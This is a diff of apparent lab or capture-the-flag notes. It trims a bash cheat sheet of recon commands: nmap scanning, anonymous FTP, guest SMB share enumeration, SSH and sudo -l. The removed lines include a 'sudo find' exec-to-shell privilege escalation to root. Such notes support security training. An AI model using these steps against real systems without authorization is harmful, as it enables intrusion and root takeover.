@@ -8,13 +8,11 @@
 
 ```bash
 nmap -sV -sC <ip>
-ftp <ip>                       # anonymous / anonymous
+ftp <ip>                       # try anonymous
 smbclient -N -L //<ip>         # list guest shares
-smbclient -N //<ip>/it         # pull the share
 smbmap -H <ip> -u guest
-ssh fieldtech@<ip>
-sudo -l
-sudo find . -exec /bin/sh \; -quit   # GTFOBins find → root
+ssh <user>@<ip>
+sudo -l                        # GTFOBins lookup for whatever appears
 ```
 
 ## Concepts
